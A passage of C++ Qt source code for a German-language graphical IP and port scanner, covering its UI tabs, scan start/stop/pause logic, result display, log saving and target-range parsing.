0);\r\n\r\n    serviceDetectionCheckBox = new QCheckBox(\"Service Erkennung\");\r\n    optionsLayout->addWidget(serviceDetectionCheckBox, 1, 1);\r\n\r\n    // Control buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n\r\n    startButton = new QPushButton(\"▶️ Scan Starten\");\r\n    startButton->setStyleSheet(\"QPushButton { background-color: #28a745; font-size: 12px; } QPushButton:hover { background-color: #218838; }\");\r\n\r\n    stopButton = new QPushButton(\"⏹️ Scan Stoppen\");\r\n    stopButton->setEnabled(false);\r\n    stopButton->setStyleSheet(\"QPushButton { background-color: #dc3545; font-size: 12px; } QPushButton:hover { background-color: #c82333; }\");\r\n\r\n    pauseButton = new QPushButton(\"⏸️ Pausieren\");\r\n    pauseButton->setEnabled(false);\r\n    pauseButton->setStyleSheet(\"QPushButton { background-color: #ffc107; color: #000; font-size: 12px; } QPushButton:hover { background-color: #e0a800; }\");\r\n\r\n    buttonLayout->addWidget(startButton);\r\n    buttonLayout->addWidget(pauseButton);\r\n    buttonLayout->addWidget(stopButton);\r\n    buttonLayout->addStretch();\r\n\r\n    // Enhanced Progress section\r\n    QGroupBox *progressGroup = new QGroupBox(\"📊 Fortschritt & Status\");\r\n    QVBoxLayout *progressLayout = new QVBoxLayout(progressGroup);\r\n\r\n    // Main progress bar\r\n    progressBar = new QProgressBar();\r\n    progressBar->setTextVisible(true);\r\n    progressBar->setFormat(\"Fortschritt: %p% (%v/%m Hosts)\");\r\n\r\n    // Status labels\r\n    QHBoxLayout *statusLayout = new QHBoxLayout();\r\n    statusLabel = new QLabel(\"Bereit zum Scannen\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #00ff00;\");\r\n\r\n    currentHostLabel = new QLabel(\"Aktueller Host: --\");\r\n    currentHostLabel->setStyleSheet(\"color: #ffff00;\");\r\n\r\n    statusLayout->addWidget(statusLabel);\r\n    statusLayout->addStretch();\r\n    statusLayout->addWidget(currentHostLabel);\r\n\r\n    // Statistics layout\r\n    QHBoxLayout *statsLayout = new QHBoxLayout();\r\n\r\n    totalHostsLabel = new QLabel(\"Gesamt: 0\");\r\n    scannedHostsLabel = new QLabel(\"Gescannt: 0\");\r\n    foundHostsLabel = new QLabel(\"Gefunden: 0\");\r\n    elapsedTimeLabel = new QLabel(\"Zeit: 00:00\");\r\n\r\n    totalHostsLabel->setStyleSheet(\"color: #ffffff; font-weight: bold;\");\r\n    scannedHostsLabel->setStyleSheet(\"color: #00aaff; font-weight: bold;\");\r\n    foundHostsLabel->setStyleSheet(\"color: #00ff00; font-weight: bold;\");\r\n    elapsedTimeLabel->setStyleSheet(\"color: #ffaa00; font-weight: bold;\");\r\n\r\n    statsLayout->addWidget(totalHostsLabel);\r\n    statsLayout->addWidget(scannedHostsLabel);\r\n    statsLayout->addWidget(foundHostsLabel);\r\n    statsLayout->addStretch();\r\n    statsLayout->addWidget(elapsedTimeLabel);\r\n\r\n    progressLayout->addWidget(progressBar);\r\n    progressLayout->addLayout(statusLayout);\r\n    progressLayout->addLayout(statsLayout);\r\n\r\n    // Add all groups to main layout\r\n    layout->addWidget(targetGroup);\r\n    layout->addWidget(optionsGroup);\r\n    layout->addLayout(buttonLayout);\r\n    layout->addWidget(progressGroup);\r\n    layout->addStretch();\r\n\r\n    // Connect signals\r\n    connect(startButton, &QPushButton::clicked, this, &IpScanner::startScan);\r\n    connect(stopButton, &QPushButton::clicked, this, &IpScanner::stopScan);\r\n    connect(pauseButton, &QPushButton::clicked, this, &IpScanner::pauseScan);\r\n}\r\n\r\nvoid IpScanner::createResultsTab()\r\n{\r\n    resultsTab = new QWidget();\r\n    mainTabWidget->addTab(resultsTab, \"📋 Scan Ergebnisse\");\r\n\r\n    QHBoxLayout *layout = new QHBoxLayout(resultsTab);\r\n\r\n    // Results tree with improved columns\r\n    hostTreeWidget = new QTreeWidget();\r\n    hostTreeWidget->setHeaderLabels({\r\n        \"IP Adresse\", \"Hostname\", \"MAC Adresse\", \"Hersteller\",\r\n        \"Status\", \"Antwortzeit\", \"Offene Ports\", \"Betriebssystem\",\r\n        \"Letzte Aktivität\", \"Services\"\r\n    });\r\n\r\n    // Set column widths\r\n    hostTreeWidget->setColumnWidth(0, 120);  // IP\r\n    hostTreeWidget->setColumnWidth(1, 150);  // Hostname\r\n    hostTreeWidget->setColumnWidth(2, 140);  // MAC\r\n    hostTreeWidget->setColumnWidth(3, 120);  // Vendor\r\n    hostTreeWidget->setColumnWidth(4, 80);   // Status\r\n    hostTreeWidget->setColumnWidth(5, 90);   // Response time\r\n    hostTreeWidget->setColumnWidth(6, 200);  // Ports\r\n    hostTreeWidget->setColumnWidth(7, 120);  // OS\r\n    hostTreeWidget->setColumnWidth(8, 140);  // Last seen\r\n\r\n    hostTreeWidget->setAlternatingRowColors(true);\r\n    hostTreeWidget->setSortingEnabled(true);\r\n    hostTreeWidget->setContextMenuPolicy(Qt::CustomContextMenu);\r\n    hostTreeWidget->setRootIsDecorated(false);\r\n\r\n    // Enhanced details panel\r\n    QVBoxLayout *detailsLayout = new QVBoxLayout();\r\n\r\n    QLabel *detailsTitle = new QLabel(\"🔍 Host Details\");\r\n    detailsTitle->setStyleSheet(\"font-size: 14px; font-weight: bold; margin: 5px;\");\r\n\r\n    hostDetailsEdit = new QTextEdit();\r\n    hostDetailsEdit->setMaximumWidth(400);\r\n    hostDetailsEdit->setReadOnly(true);\r\n\r\n    detailsLayout->addWidget(detailsTitle);\r\n    detailsLayout->addWidget(hostDetailsEdit);\r\n\r\n    QWidget *detailsWidget = new QWidget();\r\n    detailsWidget->setLayout(detailsLayout);\r\n\r\n    layout->addWidget(hostTreeWidget, 3);\r\n    layout->addWidget(detailsWidget, 1);\r\n\r\n    // Connect signals\r\n    connect(hostTreeWidget, &QTreeWidget::itemSelectionChanged, this, &IpScanner::onItemSelectionChanged);\r\n    connect(hostTreeWidget, &QTreeWidget::itemDoubleClicked, this, &IpScanner::onItemDoubleClicked);\r\n    connect(hostTreeWidget, &QWidget::customContextMenuRequested, this, &IpScanner::showContextMenu);\r\n}\r\n\r\nvoid IpScanner::createPortScanTab()\r\n{\r\n    portScanTab = new QWidget();\r\n    mainTabWidget->addTab(portScanTab, \"🔌 Port Scanner\");\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(portScanTab);\r\n\r\n    // Port scan configuration\r\n    QGroupBox *configGroup = new QGroupBox(\"🔧 Port Scan Konfiguration\");\r\n    QGridLayout *configLayout = new QGridLayout(configGroup);\r\n\r\n    configLayout->addWidget(new QLabel(\"Port Bereich:\"), 0, 0);\r\n    portRangeEdit = new QLineEdit(\"1-1000\");\r\n    portRangeEdit->setPlaceholderText(\"z.B. 22,80,443 oder 1-1000\");\r\n    configLayout->addWidget(portRangeEdit, 0, 1, 1, 2);\r\n\r\n    configLayout->addWidget(new QLabel(\"Scan Typ:\"), 1, 0);\r\n    portScanTypeCombo = new QComboBox();\r\n    portScanTypeCombo->addItems({\"TCP Connect\", \"TCP SYN\", \"UDP Scan\", \"Umfassend\"});\r\n    configLayout->addWidget(portScanTypeCombo, 1, 1);\r\n\r\n    portScanButton = new QPushButton(\"🚀 Port Scan Starten\");\r\n    portScanButton->setStyleSheet(\"QPushButton { background-color: #17a2b8; } QPushButton:hover { background-color: #138496; }\");\r\n    configLayout->addWidget(portScanButton, 2, 0, 1, 3);\r\n\r\n    // Common ports list\r\n    QGroupBox *commonGroup = new QGroupBox(\"🌐 Häufige Ports\");\r\n    QVBoxLayout *commonLayout = new QVBoxLayout(commonGroup);\r\n\r\n    commonPortsList = new QListWidget();\r\n    commonPortsList->setMaximumHeight(150);\r\n    commonPortsList->addItems({\r\n        \"21 - FTP (File Transfer)\", \"22 - SSH (Secure Shell)\", \"23 - Telnet\",\r\n        \"25 - SMTP (Email)\", \"53 - DNS\", \"80 - HTTP (Web)\",\r\n        \"110 - POP3 (Email)\", \"143 - IMAP (Email)\", \"443 - HTTPS (Secure Web)\",\r\n        \"993 - IMAPS\", \"995 - POP3S\", \"3389 - RDP (Remote Desktop)\",\r\n        \"5432 - PostgreSQL\", \"3306 - MySQL\"\r\n    });\r\n    commonLayout->addWidget(commonPortsList);\r\n\r\n    // Port results with enhanced columns\r\n    portResultsTree = new QTreeWidget();\r\n    portResultsTree->setHeaderLabels({\r\n        \"IP Adresse\", \"Port\", \"Status\", \"Service\", \"Version\", \"Banner\", \"Antwortzeit\"\r\n    });\r\n\r\n    layout->addWidget(configGroup);\r\n    layout->addWidget(commonGroup);\r\n    layout->addWidget(portResultsTree);\r\n\r\n    connect(portScanButton, &QPushButton::clicked, this, &IpScanner::portScan);\r\n    connect(commonPortsList, &QListWidget::itemDoubleClicked, this, &IpScanner::addCommonPort);\r\n}\r\n\r\nvoid IpScanner::createNetworkTab()\r\n{\r\n    networkTab = new QWidget();\r\n    mainTabWidget->addTab(networkTab, \"🌐 Netzwerk Analyse\");\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(networkTab);\r\n\r\n    // Interface selection group\r\n    QGroupBox *interfaceGroup = new QGroupBox(\"🔌 Netzwerk Interface\");\r\n    QHBoxLayout *interfaceLayout = new QHBoxLayout(interfaceGroup);\r\n\r\n    interfaceCombo = new QComboBox();\r\n    interfaceCombo->addItems(getLocalInterfaces());\r\n    interfaceLayout->addWidget(new QLabel(\"Interface:\"));\r\n    interfaceLayout->addWidget(interfaceCombo);\r\n\r\n    // Scan buttons with enhanced styling\r\n    arpScanButton = new QPushButton(\"📡 ARP Scan\");\r\n    discoveryButton = new QPushButton(\"🔍 Netzwerk Erkennung\");\r\n    QPushButton *healthCheckButton = new QPushButton(\"🏥 Gesundheitscheck\");\r\n    QPushButton *topologyButton = new QPushButton(\"🗺️ Topologie\");\r\n\r\n    arpScanButton->setStyleSheet(\"QPushButton { background-color: #6f42c1; } QPushButton:hover { background-color: #5a32a3; }\");\r\n    discoveryButton->setStyleSheet(\"QPushButton { background-color: #e83e8c; } QPushButton:hover { background-color: #d91a72; }\");\r\n    healthCheckButton->setStyleSheet(\"QPushButton { background-color: #fd7e14; } QPushButton:hover { background-color: #e8681c; }\");\r\n    topologyButton->setStyleSheet(\"QPushButton { background-color: #20c997; } QPushButton:hover { background-color: #1aa179; }\");\r\n\r\n    interfaceLayout->addWidget(arpScanButton);\r\n    interfaceLayout->addWidget(discoveryButton);\r\n    interfaceLayout->addWidget(healthCheckButton);\r\n    interfaceLayout->addWidget(topologyButton);\r\n    interfaceLayout->addStretch();\r\n\r\n    // Network statistics group\r\n    QGroupBox *statsGroup = new QGroupBox(\"📊 Netzwerk Statistiken\");\r\n    QHBoxLayout *statsLayout = new QHBoxLayout(statsGroup);\r\n\r\n    QLabel *devicesLabel = new QLabel(\"Geräte: 0\");\r\n    QLabel *routersLabel = new QLabel(\"Router: 0\");\r\n    QLabel *serversLabel = new QLabel(\"Server: 0\");\r\n    QLabel *workstationsLabel = new QLabel(\"Clients: 0\");\r\n\r\n    devicesLabel->setStyleSheet(\"color: #ffffff; font-weight: bold; padding: 5px; background: #17a2b8; border-radius: 3px;\");\r\n    routersLabel->setStyleSheet(\"color: #ffffff; font-weight: bold; padding: 5px; background: #ffc107; color: black; border-radius: 3px;\");\r\n    serversLabel->setStyleSheet(\"color: #ffffff; font-weight: bold; padding: 5px; background: #dc3545; border-radius: 3px;\");\r\n    workstationsLabel->setStyleSheet(\"color: #ffffff; font-weight: bold; padding: 5px; background: #28a745; border-radius: 3px;\");\r\n\r\n    statsLayout->addWidget(devicesLabel);\r\n    statsLayout->addWidget(routersLabel);\r\n    statsLayout->addWidget(serversLabel);\r\n    statsLayout->addWidget(workstationsLabel);\r\n    statsLayout->addStretch();\r\n\r\n    // Network tree with enhanced columns\r\n    networkTree = new QTreeWidget();\r\n    networkTree->setHeaderLabels({\r\n        \"Gerät\", \"IP Adresse\", \"MAC Adresse\", \"Hersteller\", \"Interface\", \"Typ\", \"Letzte Aktivität\"\r\n    });\r\n\r\n    // Set optimized column widths\r\n    networkTree->setColumnWidth(0, 150);  // Device name\r\n    networkTree->setColumnWidth(1, 120);  // IP\r\n    networkTree->setColumnWidth(2, 140);  // MAC\r\n    networkTree->setColumnWidth(3, 150);  // Vendor\r\n    networkTree->setColumnWidth(4, 100);  // Interface\r\n    networkTree->setColumnWidth(5, 120);  // Type\r\n    networkTree->setColumnWidth(6, 140);  // Last seen\r\n\r\n    networkTree->setAlternatingRowColors(true);\r\n    networkTree->setSortingEnabled(true);\r\n    networkTree->setRootIsDecorated(false);\r\n\r\n    // Control buttons\r\n    QHBoxLayout *controlLayout = new QHBoxLayout();\r\n    QPushButton *refreshButton = new QPushButton(\"🔄 Aktualisieren\");\r\n    QPushButton *clearButton = new QPushButton(\"🗑️ Löschen\");\r\n    QPushButton *exportButton = new QPushButton(\"📤 Exportieren\");\r\n\r\n    refreshButton->setStyleSheet(\"QPushButton { background-color: #007bff; } QPushButton:hover { background-color: #0056b3; }\");\r\n    clearButton->setStyleSheet(\"QPushButton { background-color: #dc3545; } QPushButton:hover { background-color: #c82333; }\");\r\n    exportButton->setStyleSheet(\"QPushButton { background-color: #28a745; } QPushButton:hover { background-color: #218838; }\");\r\n\r\n    controlLayout->addWidget(refreshButton);\r\n    controlLayout->addWidget(clearButton);\r\n    controlLayout->addWidget(exportButton);\r\n    controlLayout->addStretch();\r\n\r\n    layout->addWidget(interfaceGroup);\r\n    layout->addWidget(statsGroup);\r\n    layout->addWidget(networkTree);\r\n    layout->addLayout(controlLayout);\r\n\r\n    // Setup context menu\r\n    setupNetworkContextMenu();\r\n\r\n    // Connect signals\r\n    connect(arpScanButton, &QPushButton::clicked, this, &IpScanner::arpScan);\r\n    connect(discoveryButton, &QPushButton::clicked, this, &IpScanner::networkDiscovery);\r\n    connect(healthCheckButton, &QPushButton::clicked, this, &IpScanner::performNetworkHealthCheck);\r\n    connect(topologyButton, &QPushButton::clicked, this, &IpScanner::analyzeNetworkTopology);\r\n\r\n    connect(refreshButton, &QPushButton::clicked, this, &IpScanner::refreshNetworkInterfaces);\r\n    connect(clearButton, &QPushButton::clicked, [this]() {\r\n        networkTree->clear();\r\n        addLogEntry(\"Netzwerk-Ergebnisse gelöscht\", \"INFO\");\r\n    });\r\n    connect(exportButton, &QPushButton::clicked, this, &IpScanner::exportNetworkMap);\r\n\r\n    // Update statistics when tree changes\r\n    connect(networkTree, &QTreeWidget::itemChanged, this, &IpScanner::updateNetworkStatistics);\r\n\r\n    // Store references to statistics labels for updates\r\n    networkStatsLabels = {devicesLabel, routersLabel, serversLabel, workstationsLabel};\r\n}\r\nvoid IpScanner::updateNetworkStatistics()\r\n{\r\n    // Check if we have the statistics labels\r\n    if (networkStatsLabels.size() < 4) return;\r\n\r\n    int devices = networkTree->topLevelItemCount();\r\n    int routers = 0, servers = 0, workstations = 0;\r\n\r\n    for (int i = 0; i < devices; ++i) {\r\n        QTreeWidgetItem *item = networkTree->topLevelItem(i);\r\n        if (!item) continue;\r\n\r\n        QString type = item->text(5); // Type column\r\n\r\n        if (type.contains(\"Router\") || type.contains(\"Gateway\")) {\r\n            routers++;\r\n        } else if (type.contains(\"Server\")) {\r\n            servers++;\r\n        } else if (type.contains(\"Computer\") || type.contains(\"Device\")) {\r\n            workstations++;\r\n        }\r\n    }\r\n\r\n    // Update statistics labels\r\n    networkStatsLabels[0]->setText(QString(\"Geräte: %1\").arg(devices));\r\n    networkStatsLabels[1]->setText(QString(\"Router: %1\").arg(routers));\r\n    networkStatsLabels[2]->setText(QString(\"Server: %1\").arg(servers));\r\n    networkStatsLabels[3]->setText(QString(\"Clients: %1\").arg(workstations));\r\n}\r\nvoid IpScanner::createLogTab()\r\n{\r\n    logTab = new QWidget();\r\n    mainTabWidget->addTab(logTab, \"📝 Aktivitäts Log\");\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(logTab);\r\n\r\n    // Log controls\r\n    QHBoxLayout *controlLayout = new QHBoxLayout();\r\n\r\n    clearLogButton = new QPushButton(\"🗑️ Log Löschen\");\r\n    saveLogButton = new QPushButton(\"💾 Log Speichern\");\r\n    exportLogButton = new QPushButton(\"📤 Log Exportieren\");\r\n\r\n    clearLogButton->setStyleSheet(\"QPushButton { background-color: #dc3545; } QPushButton:hover { background-color: #c82333; }\");\r\n    saveLogButton->setStyleSheet(\"QPushButton { background-color: #28a745; } QPushButton:hover { background-color: #218838; }\");\r\n    exportLogButton->setStyleSheet(\"QPushButton { background-color: #17a2b8; } QPushButton:hover { background-color: #138496; }\");\r\n\r\n    controlLayout->addWidget(clearLogButton);\r\n    controlLayout->addWidget(saveLogButton);\r\n    controlLayout->addWidget(exportLogButton);\r\n    controlLayout->addStretch();\r\n\r\n    // Log filter\r\n    QHBoxLayout *filterLayout = new QHBoxLayout();\r\n    logFilterEdit = new QLineEdit();\r\n    logFilterEdit->setPlaceholderText(\"Log Einträge filtern...\");\r\n    QPushButton *filterButton = new QPushButton(\"🔍 Filter\");\r\n    filterLayout->addWidget(new QLabel(\"Filter:\"));\r\n    filterLayout->addWidget(logFilterEdit);\r\n    filterLayout->addWidget(filterButton);\r\n\r\n    // Log text area\r\n    logTextEdit = new QTextEdit();\r\n    logTextEdit->setFont(QFont(\"Consolas\", 10));\r\n\r\n    layout->addLayout(controlLayout);\r\n    layout->addLayout(filterLayout);\r\n    layout->addWidget(logTextEdit);\r\n\r\n    connect(clearLogButton, &QPushButton::clicked, logTextEdit, &QTextEdit::clear);\r\n    connect(saveLogButton, &QPushButton::clicked, this, &IpScanner::saveLog);\r\n    connect(exportLogButton, &QPushButton::clicked, this, &IpScanner::exportResults);\r\n    connect(filterButton, &QPushButton::clicked, this, &IpScanner::filterLog);\r\n\r\n    // Add initial log entry\r\n    addLogEntry(\"IP Scanner initialisiert - Bereit für Netzwerk-Scans\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::startScan()\r\n{\r\n    if (targetEdit->text().isEmpty()) {\r\n        QMessageBox::warning(this, \"⚠️ Warnung\", \"Bitte geben Sie einen Ziel-IP-Bereich ein!\");\r\n        return;\r\n    }\r\n\r\n    // Reset scan state\r\n    scanRunning = true;\r\n    scanPaused = false;\r\n    scannedHosts = 0;\r\n    completedHosts = 0;\r\n    discoveredHosts.clear();\r\n\r\n    // Update UI\r\n    startButton->setEnabled(false);\r\n    stopButton->setEnabled(true);\r\n    pauseButton->setEnabled(true);\r\n    clearResults();\r\n\r\n    currentTarget = targetEdit->text();\r\n    threadPool->setMaxThreadCount(threadsSpinBox->value());\r\n\r\n    // Parse targets and update totals\r\n    QStringList targets = parseTargetString(currentTarget);\r\n    totalHosts = targets.size();\r\n\r\n    // Update progress display\r\n    progressBar->setRange(0, totalHosts);\r\n    progressBar->setValue(0);\r\n    totalHostsLabel->setText(QString(\"Gesamt: %1\").arg(totalHosts));\r\n    scannedHostsLabel->setText(\"Gescannt: 0\");\r\n    foundHostsLabel->setText(\"Gefunden: 0\");\r\n    statusLabel->setText(\"🔄 Scan läuft...\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #ffaa00;\");\r\n\r\n    addLogEntry(QString(\"Scan gestartet für Ziel: %1 (%2 Hosts)\").arg(currentTarget).arg(totalHosts), \"INFO\");\r\n\r\n    // Start elapsed time tracking\r\n    scanStartTime = QDateTime::currentDateTime();\r\n\r\n    // Create and start scan workers\r\n    for (const QString &ip : targets) {\r\n        ScanWorker *worker = new ScanWorker(ip, timeoutSpinBox->value());\r\n        worker->setHostIndex(scannedHosts++); // Set index for progress tracking\r\n\r\n        // Connect signals with explicit lambda capturing\r\n        connect(worker, &ScanWorker::hostFound, this, [this](const HostInfo &host) {\r\n            this->onHostFound(host);\r\n        });\r\n\r\n        connect(worker, &ScanWorker::hostCompleted, this, [this]() {\r\n            this->onHostCompleted();\r\n        });\r\n\r\n        threadPool->start(worker);\r\n    }\r\n\r\n    // Start progress update timers\r\n    updateTimer->start(500);  // Update UI every 500ms\r\n    progressTimer->start(100); // Update progress every 100ms\r\n}\r\n\r\nvoid IpScanner::stopScan()\r\n{\r\n    scanRunning = false;\r\n    scanPaused = false;\r\n\r\n    // Update UI\r\n    startButton->setEnabled(true);\r\n    stopButton->setEnabled(false);\r\n    pauseButton->setEnabled(false);\r\n    pauseButton->setText(\"⏸️ Pausieren\");\r\n\r\n    threadPool->clear();\r\n    updateTimer->stop();\r\n    progressTimer->stop();\r\n\r\n    statusLabel->setText(\"🛑 Scan gestoppt\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #ff0000;\");\r\n\r\n    addLogEntry(\"Scan vom Benutzer gestoppt\", \"WARNING\");\r\n\r\n    QString finalMessage = QString(\"Scan beendet. %1 von %2 Hosts gefunden\")\r\n                               .arg(discoveredHosts.size()).arg(totalHosts);\r\n    statusBar()->showMessage(finalMessage);\r\n}\r\n\r\nvoid IpScanner::onHostFound(const HostInfo &host)\r\n{\r\n    QMutexLocker locker(&hostListMutex);\r\n    discoveredHosts.append(host);\r\n\r\n    // Add to tree widget with enhanced display\r\n    QTreeWidgetItem *item = new QTreeWidgetItem();\r\n    item->setText(0, host.ip);\r\n    item->setText(1, host.hostname.isEmpty() ? \"Unbekannt\" : host.hostname);\r\n    item->setText(2, host.macAddress.isEmpty() ? \"N/A\" : host.macAddress);\r\n    item->setText(3, host.vendor.isEmpty() ? \"Unbekannt\" : host.vendor);\r\n    item->setText(4, host.isAlive ? \"🟢 Online\" : \"🔴 Offline\");\r\n    item->setText(5, host.responseTime >= 0 ? QString(\"%1 ms\").arg(host.responseTime) : \"Timeout\");\r\n    item->setText(6, host.openPorts.isEmpty() ? \"Keine erkannt\" : host.openPorts.join(\", \"));\r\n    item->setText(7, host.os.isEmpty() ? \"Unbekannt\" : host.os);\r\n    item->setText(8, host.lastSeen.toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n    item->setText(9, host.services.isEmpty() ? \"Keine\" : host.services.join(\", \"));\r\n\r\n    // Enhanced color coding\r\n    if (host.isAlive) {\r\n        item->setBackground(0, QColor(0, 120, 0, 100));\r\n        item->setIcon(0, QIcon()); // Could add online icon\r\n    } else {\r\n        item->setBackground(0, QColor(120, 0, 0, 100));\r\n        item->setIcon(0, QIcon()); // Could add offline icon\r\n    }\r\n\r\n    hostTreeWidget->addTopLevelItem(item);\r\n\r\n    // Update found hosts counter\r\n    foundHostsLabel->setText(QString(\"Gefunden: %1\").arg(discoveredHosts.size()));\r\n\r\n    addLogEntry(QString(\"Host gefunden: %1 (%2) - Status: %3\")\r\n                    .arg(host.ip, host.hostname.isEmpty() ? \"Unbekannt\" : host.hostname, host.isAlive ? \"Online\" : \"Offline\"),\r\n                host.isAlive ? \"SUCCESS\" : \"INFO\");\r\n}\r\n\r\nvoid IpScanner::onHostCompleted()\r\n{\r\n    QMutexLocker locker(&hostListMutex);\r\n    completedHosts++;\r\n\r\n    // Update current host display\r\n    if (completedHosts <= totalHosts) {\r\n        currentHostLabel->setText(QString(\"Host %1/%2 abgeschlossen\").arg(completedHosts).arg(totalHosts));\r\n        scannedHostsLabel->setText(QString(\"Gescannt: %1\").arg(completedHosts));\r\n    }\r\n\r\n    // Check if scan is complete\r\n    if (completedHosts >= totalHosts) {\r\n        onScanFinished();\r\n    }\r\n}\r\n\r\nvoid IpScanner::updateProgress()\r\n{\r\n    if (!scanRunning) return;\r\n\r\n    // Update progress bar\r\n    progressBar->setValue(completedHosts);\r\n\r\n    // Update elapsed time\r\n    if (!scanStartTime.isNull()) {\r\n        qint64 elapsed = scanStartTime.msecsTo(QDateTime::currentDateTime());\r\n        int seconds = elapsed / 1000;\r\n        int minutes = seconds / 60;\r\n        seconds = seconds % 60;\r\n        elapsedTimeLabel->setText(QString(\"Zeit: %1:%2\").arg(minutes, 2, 10, QChar('0')).arg(seconds, 2, 10, QChar('0')));\r\n    }\r\n}\r\n\r\nvoid IpScanner::updateScanProgress()\r\n{\r\n    if (!scanRunning) return;\r\n\r\n    // This could be used for more detailed progress updates\r\n    // Currently handled by updateProgress()\r\n}\r\n\r\nvoid IpScanner::onScanFinished()\r\n{\r\n    scanRunning = false;\r\n\r\n    // Update UI\r\n    startButton->setEnabled(true);\r\n    stopButton->setEnabled(false);\r\n    pauseButton->setEnabled(false);\r\n    pauseButton->setText(\"⏸️ Pausieren\");\r\n\r\n    progressBar->setValue(totalHosts);\r\n    statusLabel->setText(\"✅ Scan abgeschlossen\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #00ff00;\");\r\n    currentHostLabel->setText(\"Scan abgeschlossen\");\r\n\r\n    updateTimer->stop();\r\n    progressTimer->stop();\r\n\r\n    addLogEntry(QString(\"Scan abgeschlossen! %1 von %2 Hosts gefunden in %3\")\r\n                    .arg(discoveredHosts.size())\r\n                    .arg(totalHosts)\r\n                    .arg(elapsedTimeLabel->text().split(\": \")[1]), \"SUCCESS\");\r\n\r\n    QString finalMessage = QString(\"Scan erfolgreich beendet - %1 aktive Hosts von %2 gefunden\")\r\n                               .arg(discoveredHosts.size()).arg(totalHosts);\r\n    statusBar()->showMessage(finalMessage);\r\n\r\n    // Auto-resize columns for better display\r\n    for (int i = 0; i < hostTreeWidget->columnCount(); ++i) {\r\n        hostTreeWidget->resizeColumnToContents(i);\r\n    }\r\n}\r\n\r\nvoid IpScanner::pauseScan()\r\n{\r\n    if (scanPaused) {\r\n        resumeScan();\r\n    } else {\r\n        scanPaused = true;\r\n        pauseButton->setText(\"▶️ Fortsetzen\");\r\n        statusLabel->setText(\"⏸️ Scan pausiert\");\r\n        statusLabel->setStyleSheet(\"font-weight: bold; color: #ffaa00;\");\r\n        addLogEntry(\"Scan pausiert\", \"INFO\");\r\n        updateTimer->stop();\r\n    }\r\n}\r\n\r\nvoid IpScanner::resumeScan()\r\n{\r\n    scanPaused = false;\r\n    pauseButton->setText(\"⏸️ Pausieren\");\r\n    statusLabel->setText(\"🔄 Scan läuft...\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #ffaa00;\");\r\n    addLogEntry(\"Scan fortgesetzt\", \"INFO\");\r\n    updateTimer->start(500);\r\n}\r\n\r\nvoid IpScanner::addCommonPort()\r\n{\r\n    QListWidgetItem *item = commonPortsList->currentItem();\r\n    if (item) {\r\n        QString portText = item->text();\r\n        QString portNumber = portText.split(\" - \")[0];\r\n\r\n        QString currentPorts = portRangeEdit->text();\r\n        if (!currentPorts.isEmpty() && !currentPorts.endsWith(\",\")) {\r\n            currentPorts += \",\";\r\n        }\r\n        currentPorts += portNumber;\r\n        portRangeEdit->setText(currentPorts);\r\n\r\n        addLogEntry(QString(\"Port %1 zur Scan-Liste hinzugefügt\").arg(portNumber), \"INFO\");\r\n    }\r\n}\r\n\r\nvoid IpScanner::filterLog()\r\n{\r\n    QString filterText = logFilterEdit->text().toLower();\r\n    if (filterText.isEmpty()) {\r\n        // Show all log entries\r\n        return;\r\n    }\r\n\r\n    // Implementation for log filtering would go here\r\n    addLogEntry(QString(\"Log gefiltert nach: '%1'\").arg(filterText), \"INFO\");\r\n}\r\n\r\nvoid IpScanner::saveLog()\r\n{\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"Log Speichern\",\r\n                                                    QString(\"scan_log_%1.txt\").arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"Text Files (*.txt);;All Files (*)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {\r\n        QMessageBox::warning(this, \"❌ Fehler\", \"Datei konnte nicht zum Schreiben geöffnet werden\");\r\n        return;\r\n    }\r\n\r\n    QTextStream stream(&file);\r\n    stream << logTextEdit->toPlainText();\r\n\r\n    addLogEntry(QString(\"Log gespeichert: %1\").arg(fileName), \"SUCCESS\");\r\n    QMessageBox::information(this, \"✅ Erfolg\", QString(\"Log erfolgreich gespeichert:\\n%1\").arg(fileName));\r\n}\r\n\r\n// Enhanced helper functions\r\nQStringList IpScanner::parseTargetString(const QString &target)\r\n{\r\n    QStringList result;\r\n    addLogEntry(QString(\"Parse Ziel: %1\").arg(target), \"DEBUG\");\r\n\r\n    // Trimmen des Eingabetexts\r\n    QString cleanTarget = target.trimmed();\r\n\r\n    if (cleanTarget.contains('/')) {\r\n        // CIDR Notation (z.B. 192.168.0.0/16, 10.0.0.0/8)\r\n        result = parseCIDRRange(cleanTarget);\r\n    }\r\n    else if (cleanTarget.contains('-')) {\r\n        // Range format mit erweiterten Möglichkeiten\r\n        result = parseIPRange(cleanTarget);\r\n    }\r\n    else if (cleanTarget.contains(',')) {\r\n        // Comma-separated IPs\r\n        QStringList ips = cleanTarget.split(',');\r\n        for (const QString &ip : ips) {\r\n            QString cleanIp = ip.trimmed();\r\n            if (!cleanIp.isEmpty() && isValidIP(cleanIp)) {\r\n                result.append(cleanIp);\r\n            }\r\n        }\r\n        addLogEntry(QString(\"Mehrere IPs erkannt: %1 Adressen\").arg(result.size()), \"INFO\");\r\n    }\r\n    else if (cleanTarget.contains('*')) {\r\n        // Wildcard format (z.B. 192.168.*.*, 10.0.1.*)\r\n        result = parseWildcardRange(cleanTarget);\r\n    }\r\n    else {\r\n        // Single IP\r\n        if (isValidIP(cleanTarget)) {\r\n            result.append(cleanTarget);\r\n            addLogEntry(QString(\"Einzelne IP erkannt: %1\").arg(cleanTarget), \"INFO\");\r\n        } else {\r\n            addLogEntry(QString(\"Ungültige IP-Adresse: %1\").arg(cleanTarget), \"ERROR\");\r\n        }\r\n    }\r\n\r\n    return result;\r\n}\r\nbool IpScanner::isValidIP(const QString &ip)\r\n{\r\n    QStringList parts = ip.split('.');\r\n    if (parts.size() != 4) return false;\r\n\r\n    for (const QString &part : parts) {\r\n        bool 